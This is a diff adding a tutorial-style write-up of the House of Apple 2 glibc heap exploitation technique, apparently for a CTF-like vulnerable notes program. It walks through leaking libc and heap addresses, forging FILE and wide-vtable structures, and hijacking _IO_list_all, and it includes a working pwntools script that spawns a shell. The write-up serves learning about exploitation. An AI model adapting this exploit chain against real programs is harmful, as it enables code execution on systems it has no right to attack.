@@ -572,6 +572,489 @@ While looking through more on house of apple i found this image , which was on t
 
 <img width="1777" height="713" alt="image" src="https://github.com/user-attachments/assets/be6ae49a-02aa-4365-a7be-2d11803e456f" />
 
+In older glibc versions (< 2.24), you could directly overwrite FILE structure vtables. But glibc added **vtable validation** that checks if vtable pointers are within valid memory ranges.
+
+House of Apple 2 bypasses these protections by relying on a design gap in glibc’s FILE validation logic. Instead of forging a fake vtable, it reuses a legitimate and fully validated vtable (`_IO_wfile_jumps`), which passes all internal consistency checks. The exploit then redirects the **wide-character vtable pointer**, which glibc does not subject to the same validation as the primary vtable. When a wide-character I/O path is triggered, glibc dispatches function calls through this unvalidated wide vtable, allowing the attacker to gain control of execution without tripping the standard vtable integrity checks.
+
+When a program calls something like `fwrite()`, glibc eventually looks up a function pointer from the FILE structure’s vtable and calls it. This means the program trusts whatever function address is stored in that table. If an attacker can control that pointer, they get to choose what code runs. That’s the core idea about apple 
+
+glibc also keeps a global linked list of every open FILE stream called `_IO_list_all`. When the program exits, glibc walks this list to flush and close all files. It starts at `_IO_list_all`, follows each `_chain` pointer, and calls flush-related functions on every FILE object it finds. The attack abuses this cleanup step by corrupting the list so that it points to a fake or attacker-controlled FILE structure. When glibc later flushes all streams, it unknowingly calls functions through the attacker-controlled vtable, giving code execution.
+
+This is a simple notes application with the following functions:
+
+```
+1. Create note - Allocates heap memory for a note
+2. Delete note - Frees a note
+3. Read note   - Displays note content
+4. Write note  - Writes data to a note at an offset
+5. Exit        - Exits the program
+```
+
+The vulnerability is in the **write_note** function:
+
+```c
+void write_note(int idx, size_t offset, char *data) {
+    // BUG: offset is NOT validated!
+    scanf("%s", notes[idx] + offset);
+}
+```
+
+**What this means:**
+- `notes[idx]` is a pointer to our note on the heap
+- We can specify ANY `offset` (positive or negative!)
+- `notes[idx] + offset` lets us write ANYWHERE relative to our note
+
+**Example:**
+```c
+// If notes[0] is at address 0x555555559000
+// and we use offset = -0x1000
+// We write to: 0x555555559000 - 0x1000 = 0x555555558000
+
+// Or if offset = 0x10000, we write to:
+// 0x555555559000 + 0x10000 = 0x555555569000
+```
+
+This is  an **arbitrary relative write** - we can write anywhere in 
+memory relative to our heap 
+
+
+
+So First, we need to **leak a libc address**. ASLR randomizes where libc lives in memory, so until we know its base address, we can’t reliably call functions like `system`. Once we leak one libc pointer, we can calculate where everything else in libc is.
+
+Next, we **leak a heap address**. This tells us where our controlled data lives in memory. We need this because we’re going to place a fake object on the heap and later make the program treat it as something real.
+
+Then we **build a fake FILE structure on the heap**. A FILE structure is just a big struct full of pointers and flags. glibc trusts it. If we carefully fill it with the right values, glibc won’t realize it’s fake.
+
+After that, we **patch critical FILE pointers** like `_lock`, `_wide_data`, and the wide vtable pointer. These fields are needed so glibc doesn’t crash and so execution eventually flows into a function pointer we control.
+
+Next, we **overwrite `_IO_list_all`** so that instead of pointing to real FILE streams, it points to our fake FILE structure on the heap. Now glibc thinks our fake object is a real file that needs to be flushed.
+
+Finally, we **trigger `exit()`**. When the program exits, glibc automatically walks `_IO_list_all` and flushes every FILE it sees. When it reaches our fake FILE, it follows our controlled pointers and ends up calling `system("/bin/sh")`.
+
+
+When we call exit ; this is somewhat of a representation of whats happening 
+
+
+
+<img width="468" height="695" alt="image" src="https://github.com/user-attachments/assets/0499dc08-b4aa-4289-98a9-38e9f218a5e2" />
+
+
+
+glibc tries to defend against FILE-structure attacks by validating the **main vtable** pointer before using it. That means if you point the main vtable to something fake or attacker-made, glibc will usually detect it and abort. House of Apple 2 avoids this by **not forging a vtable at all**. Instead, it uses a real, legitimate vtable that already exists inside libc, such as `_IO_wfile_jumps`, which passes all validation checks cleanly.
+
+The trick is that FILE structures used for wide-character I/O contain a **second vtable**, called the `_wide_vtable`. Unlike the main vtable, this wide vtable is **not validated** by glibc. Once execution enters a wide-character code path, glibc blindly trusts the function pointers inside `_wide_vtable`. By overwriting this pointer, the attacker gains control over which function gets called next.
+
+ First leak a libc address because modern systems use ASLR, which means libc is loaded at a random address every time the program runs. If we do not know where libc is in memory, we cannot reliably call important functions like system. To defeat ASLR, we need to leak one real libc address and use it to calculate the rest.
+
+The program lets us read memory using a negative index, which means we can read data before the notes array. In memory, the Global Offset Table (GOT) is located nearby, and it stores the real runtime addresses of libc functions such as free. When we call read_note(-16), we accidentally read the GOT entry for free, leaking its address.
+
+Once we have the leaked address of free, we subtract its known offset inside libc. This gives us the base address of libc in memory. From that single value, we can calculate the addresses of all other libc functions, including system, which we will need later in the exploit
+
+<img width="681" height="447" alt="image" src="https://github.com/user-attachments/assets/8a7fcfcf-da9a-4e7b-a793-151309d33a27" />
+
+We need to create a fake `_IO_FILE_plus` structure on the heap with three 
+parts:
+
+## Part A: Fake `_IO_FILE` structure
+
+```python
+fake_file = flat({
+    0x00: b"  sh\x00\x00\x00\x00",    # _flags
+    0x88: 0,                         # _lock
+    0xa0: 0,                         # _wide_data
+    0xc0: 1,                         # _mode
+    0xd8: libc.sym['_IO_wfile_jumps']
+}, length=224)
+```
+
+This creates a **fake FILE object** exactly the size glibc expects.
+
+* **`_flags = "  sh"`**
+  This field normally stores flags, but later glibc passes it as an argument to a function pointer. Since we hijack that function to be `system`, this becomes:
+
+  ```
+  system("  sh")
+  ```
+
+  which spawns a shell. The spaces help avoid validation checks.
+
+* **`_lock`**
+  glibc expects this to point to writable memory. If it’s invalid, the program crashes. We set it to zero for now and patch it later to point into the heap.
+
+* **`_wide_data`**
+  This tells glibc where the wide-character data lives. We will make this point to another fake structure we control.
+
+* **`_mode = 1`**
+  This forces glibc to use **wide-character functions**, which is crucial because those functions use the unvalidated wide vtable.
+
+* **`vtable = _IO_wfile_jumps`**
+  This is a **real vtable inside libc**. Using a legitimate vtable avoids glibc’s vtable integrity checks.
+
+At this point, glibc thinks this is a completely valid FILE object.
+
+---
+
+## Part B: Fake `_IO_wide_data`
+
+```python
+wide_data = flat({
+    0x18: 0,   # _IO_write_base
+    0x20: 1,   # _IO_write_ptr
+    0xe0: 0    # _wide_vtable
+}, length=0x100)
+```
+
+This structure controls **when glibc decides to flush a file**.
+
+* **`_IO_write_ptr > _IO_write_base`**
+  Since `1 > 0`, glibc believes there is pending data that needs to be flushed.
+
+* When glibc flushes, it calls a function from the **wide vtable**, which we control next.
+
+* **`_wide_vtable`**
+  This will be patched to point to our fake wide vtable.
+
+This is how we force glibc to actually make the function call.
+
+---
+
+## Part C: Fake wide vtable
+
+```python
+wide_vtable = flat({
+    0x68: libc.sym['system']
+}, length=0x80)
+```
+
+
+
+* The `doallocate` function pointer is overwritten with `system`.
+* glibc does **not validate** this wide vtable.
+* When glibc calls `doallocate`, it actually calls:
+
+  ```
+  system(fake_file->_flags)
+  ```
+
+And since `_flags = "  sh"`, we get a shell.
+
+---
+
+## How everything is laid out in memory
+
+```
+Offset 0x000: fake _IO_FILE      (224 bytes)
+Offset 0x100: fake _IO_wide_data (256 bytes)
+Offset 0x200: fake wide_vtable   (128 bytes)
+```
+
+And then we write it into the heap:
+
+```python
+payload = fake_file.ljust(0x100, b'\x00')
+payload += wide_data.ljust(0x200 - 0x100, b'\x00')
+payload += wide_vtable
+
+create(20000, payload)
+```
+
+This puts **all fake structures next to each other**, so pointers inside them can reference each other safely.
+
+
+#### Leaking the heap address
+
+```python
+heap_addr = u64(read_note(0).ljust(8, b'\x00'))
+```
+
+At this point, we already created a note that lives on the heap. When we read that note back, the program does not just give us our clean payload. It also leaks **heap metadata** that glibc stores next to heap chunks. This metadata contains pointers that point back into the heap itself.
+
+By reading the first few bytes of the note and converting them into a 64-bit value, we recover a **real heap address**. 
+
+
+
+####  Patching the fake FILE pointers
+
+Now that we know the heap base address, we can **fix up the fake FILE structure** so all its internal pointers point to valid memory.
+
+```python
+write_note(0, 0x88, p64(heap_addr + 0x10))   # _lock
+```
+
+The `_lock` field must point to writable memory or glibc will crash when it tries to lock the FILE. We point it slightly inside the heap, which is always writable.
+
+```python
+write_note(0, 0xa0, p64(heap_addr + 0x100))  # _wide_data
+```
+
+This tells glibc where the wide-character data lives. We already placed our fake `_IO_wide_data` structure at offset `0x100` inside the payload, so we point `_wide_data` there.
+
+```python
+write_note(0, 0x1e0, p64(heap_addr + 0x200)) # _wide_vtable
+```
+
+Finally, we patch the `_wide_vtable` pointer to point to our fake wide vtable, which we placed at offset `0x200`. This is the most important pointer, because glibc does **not validate** it. When glibc later calls a wide-character function, it will jump to whatever function pointer we placed there.
+
+<img width="663" height="618" alt="image" src="https://github.com/user-attachments/assets/f1b40f7d-cd7b-4abf-987d-28566db2936e" />
+
+
+
+
+#### Hijacking `_IO_list_all` 
+
+This is the most important step of the whole exploit. Until now, we’ve only *prepared* our fake FILE structure. Now we force glibc to actually **use it**.
+
+glibc keeps a global pointer called `_IO_list_all`. This pointer is the **head of a linked list of all FILE structures** that exist in the program. When the program exits, glibc walks this list and flushes every file it finds.
+
+Normally, `_IO_list_all` points to real FILE objects inside libc.
+
+
+
+
+
+```python
+io_list_all = libc.sym['_IO_list_all']
+offset = io_list_all - heap_addr
+write_note(0, offset, p64(heap_addr))
+```
+
+
+
+
+```python
+io_list_all = libc.sym['_IO_list_all']
+```
+
+Now that we know the libc base address, we can compute the **exact address** of `_IO_list_all` in memory.
+
+```python
+offset = io_list_all - heap_addr
+```
+
+Our arbitrary write primitive is relative to the start of our heap note.
+So we calculate how far `_IO_list_all` is **from our heap buffer**.
+
+This converts an absolute address into a relative offset we can write to.
+
+```python
+write_note(0, offset, p64(heap_addr))
+```
+
+This is the takeover.
+
+We overwrite the value of `_IO_list_all` so that instead of pointing to real FILE objects, it now points directly to **our fake FILE structure on the heap**.
+
+
+
+glibc does **not** check whether `_IO_list_all` points to a real FILE.
+It blindly trusts the pointer.
+
+So after this write:
+
+* glibc believes our fake FILE is a real one
+* it adds it to the cleanup process
+* when `exit()` is called, glibc will process *our* FILE
+
+
+
+**Before**
+
+```
+_IO_list_all → real FILE → real FILE → ...
+```
+
+**After**
+
+```
+_IO_list_all → fake FILE (heap) → fake wide_data → fake vtable → system()
+```
+
+### final exploit
+
+
+```python
+from pwn import *
+
+elf = ELF('./notes_patched')
+libc = ELF('./libc.so.6')
+p = process('./notes_patched')
+```
+
+**What this does:**
+- `ELF()` loads binary information (addresses, symbols, etc.)
+- `process()` starts the target program
+- `pwn` library handles communication and address packing
+
+### Helper Functions
+
+```python
+def create(size, content):
+    p.sendlineafter(b'>> ', b'1')           # Select create option
+    p.sendlineafter(b'SIZE: ', str(size).encode())
+    p.sendlineafter(b'CHARS): ', content)   # Send note content
+```
+
+This function automates creating a note by:
+1. Waiting for the menu prompt `>> `
+2. Sending option `1` (create)
+3. Sending the size
+4. Sending the content
+
+
+```python
+def read_note(idx):
+    p.sendlineafter(b'>> ', b'3')
+    p.sendlineafter(b'INDEX: ', str(idx).encode())
+    p.recvuntil(b'NOTE: ')
+    data = p.recvuntil(b'< BACK', drop=True)
+    return data
+```
+
+Reads a note and returns its content. `drop=True` removes the `< BACK` delimiter.
+
+```python
+def write_note(idx, offset, content):
+    p.sendlineafter(b'>> ', b'4')
+    p.sendlineafter(b'INDEX: ', str(idx).encode())
+    p.sendlineafter(b'INDEX: ', str(offset).encode())
+    p.sendlineafter(b'DATA: ', content)
+```
+
+Writes to a note at a specific offset (the vulnerability!).
+
+### Exploitation
+
+```python
+# Leak libc
+libc_leak = u64(read_note(-16).ljust(8, b'\x00'))
+libc.address = libc_leak - libc.sym['free']
+```
+
+- `u64()` unpacks 8 bytes to a 64-bit integer
+- `ljust(8, b'\x00')` pads data to 8 bytes
+- Subtracting `free` offset gives us libc base
+
+```python
+# Build fake FILE
+fake_file = flat({
+    0x00: b"  sh\x00\x00\x00\x00",
+    0x88: 0,
+    0xa0: 0,
+    0xc0: 1,
+    0xd8: libc.sym['_IO_wfile_jumps']
+}, length=224, filler=b'\x00')
+```
+
+`flat()` creates binary data with values at specific offsets, padding with null bytes.
+
+```python
+# Patch pointers
+write_note(0, 0x88, p64(heap_addr + 0x10))
+```
+
+- `p64()` packs a 64-bit integer to 8 bytes (little-endian)
+- Overwrites the `_lock` field at offset 0x88
+
+```python
+# Hijack _IO_list_all
+offset = io_list_all - heap_addr
+write_note(0, offset, p64(heap_addr))
+```
+
+Uses the arbitrary relative write to overwrite `_IO_list_all` in libc!
+
+---
+
+## Why This Works
+
+### The glibc Call Chain
+
+When you exit, glibc does this:
+
+```c
+// In elf/dl-fini.c
+exit() {
+    ...
+    _IO_cleanup();
+}
+
+// In libio/genops.c
+_IO_cleanup() {
+    return _IO_flush_all_lockp(0);
+}
+
+// In libio/genops.c
+_IO_flush_all_lockp() {
+    struct _IO_FILE *fp;
+
+    // Iterate the chain!
+    for (fp = _IO_list_all; fp != NULL; fp = fp->_chain) {
+
+        // Check if buffer needs flushing
+        if (fp->_IO_write_ptr > fp->_IO_write_base) {
+
+            // Call overflow from vtable
+            if (fp->_mode <= 0) {
+                // Normal mode
+                _IO_overflow(fp, EOF);
+            } else {
+                // Wide mode (our case!)
+                _IO_wfile_overflow(fp, WEOF);
+            }
+        }
+    }
+
+}
+// In libio/wfileops.c
+_IO_wfile_overflow() {
+    ...
+    // Check vtable (VALIDATED ✓)
+    _IO_vtable_check(fp->vtable);  // Passes! We use _IO_wfile_jumps
+
+    // Eventually calls:
+    fp->_wide_data->_wide_vtable->doallocate(fp);
+    // ↑ NOT VALIDATED ✗
+}
+```
+
+### The Bypass
+
+**glibc's protection:**
+```c
+void _IO_vtable_check(struct _IO_jump_t *vtable) {
+    // Check if vtable is in valid range
+    if (vtable < &__start__IO_vtables ||
+        vtable >= &__stop__IO_vtables) {
+        abort();  // Kill the program!
+    }
+}
+```
+
+
+1. We use `_IO_wfile_jumps` (a real vtable) 
+2. But `_wide_vtable` is NOT checked 
+3. When `doallocate` is called from `_wide_vtable`, it executes our function
+
+
+<img width="725" height="572" alt="image" src="https://github.com/user-attachments/assets/2d928329-1722-47ce-99af-cd404908587e" />
+
+
+## More on house of apple how it works 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
